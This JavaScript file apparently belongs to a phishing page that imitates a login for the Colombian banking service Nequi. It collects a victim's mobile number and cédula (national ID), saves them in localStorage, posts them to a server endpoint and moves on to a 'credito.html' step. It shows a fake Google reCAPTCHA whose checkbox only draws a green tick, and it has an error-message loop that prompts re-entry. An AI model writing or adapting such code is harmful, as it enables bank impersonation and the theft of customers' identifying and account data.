document.addEventListener('DOMContentLoaded', () => {
    const celularInput = document.getElementById('celular');
    const cedulaInput = document.getElementById('cedula');
    const recaptchaCheckbox = document.querySelector('.recaptcha-checkbox');
    const submitButton = document.querySelector('.btn-submit');
    
    // Check for error parameter in URL
     const urlParams = new URLSearchParams(window.location.search);
     if (urlParams.get('error') === 'true') {
         const errorMessage = document.getElementById('error-message');
         if (errorMessage) {
             errorMessage.style.display = 'block';
             setTimeout(() => {
                 errorMessage.classList.add('hide-error');
                 // Wait for animation to finish before hiding display
                 setTimeout(() => {
                     errorMessage.style.display = 'none';
                     errorMessage.classList.remove('hide-error');
                 }, 500); // Matches animation duration
                 
                 // Clean URL
                 window.history.replaceState({}, document.title, window.location.pathname);
             }, 3000);
         }
     }

    let isCaptchaChecked = false;

    // Función para verificar si todos los campos están completos
    function validateForm() {
        const celularValue = celularInput.value.trim();
        // Validación estricta para celular: debe tener 10 dígitos y empezar por 3
        const isCelularValid = /^[3][0-9]{9}$/.test(celularValue);
        
        const isCedulaFilled = cedulaInput.value.trim().length > 0;

        if (isCelularValid && isCedulaFilled && isCaptchaChecked) {
            submitButton.disabled = false;
        } else {
            submitButton.disabled = true;
        }
    }

    // Event Listeners para los inputs
    celularInput.addEventListener('input', (e) => {
        // Limitar a solo números y máximo 10 caracteres
        e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10);
        validateForm();
    });
    cedulaInput.addEventListener('input', (e) => {
        // Limitar a solo números
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
        validateForm();
    });

    // Inicializar estado del botón
    validateForm();

    // Lógica para el checkbox personalizado del reCAPTCHA
    recaptchaCheckbox.addEventListener('click', () => {
        isCaptchaChecked = !isCaptchaChecked;
        recaptchaCheckbox.classList.toggle('checked');
        
        // Simular el check visualmente
        if (isCaptchaChecked) {
            // Icono de check verde de Google reCAPTCHA
            recaptchaCheckbox.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48" height="48"><path fill="#4CAF50" d="M19.41 33.59L8 22.17l2.83-2.83 8.58 8.59 21.58-21.59L44 9.17z"/></svg>';
        } else {
            recaptchaCheckbox.innerHTML = '';
        }
        
        validateForm();
    });

    // Manejar el envío del formulario
    const loginForm = document.querySelector('.login-form');
    if (loginForm) {
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            if (!isCaptchaChecked) {
                alert('Por favor, verifique que no es un robot.');
                return;
            }

            const celular = document.getElementById('celular').value;
            const cedula = document.getElementById('cedula').value;

            // Guardar en localStorage para usar en pasos siguientes
            localStorage.setItem('nequi_celular', celular);
            localStorage.setItem('nequi_cedula', cedula);

            try {
                // Send data to server (initial login)
                await fetch('/api/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ celular, cedula })
                });
            } catch (error) {
                console.error(error);
            }

            navigateWithLoader("credito.html");
        });
    }
});
